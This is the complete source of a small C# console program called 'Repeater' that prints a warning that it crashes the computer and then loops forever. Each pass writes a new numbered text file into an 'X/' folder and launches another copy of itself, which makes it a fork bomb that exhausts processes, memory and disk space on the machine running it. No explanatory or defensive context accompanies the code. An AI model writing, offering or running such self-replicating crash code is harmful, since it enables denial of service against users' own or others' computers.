using System;
using System.Threading;
using System.Diagnostics;
using System.IO;
namespace Repeater
{
    public static class Repeat
    {
        public const string InternalVersion = "1.0.7";
        public static ulong x;
        public static string XDir = "X/";
        public static bool Always = true;
        [STAThread]
        public static void Main(string[] args)
        {
            Console.Title = "Repeater" + " v" + InternalVersion;
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            string Message = "You just launched a program that crashes your computer!";
            Console.WriteLine(Message);
            if (Directory.Exists(XDir)) 
            {
                Directory.Delete(XDir);
            }
            else {
                Directory.CreateDirectory(XDir);
            }
            Thread.Sleep(100);
            while (Always)
                {
                Console.Out.Flush();
                x++;
                string StrX = x.ToString();
                string XPath = XDir + StrX + ".txt";
                File.AppendAllText(XPath, StrX);
                Console.Write('\r' + StrX);
                Console.Out.Flush();
                Process.Start("Repeater.exe");
            }
        }
    }
}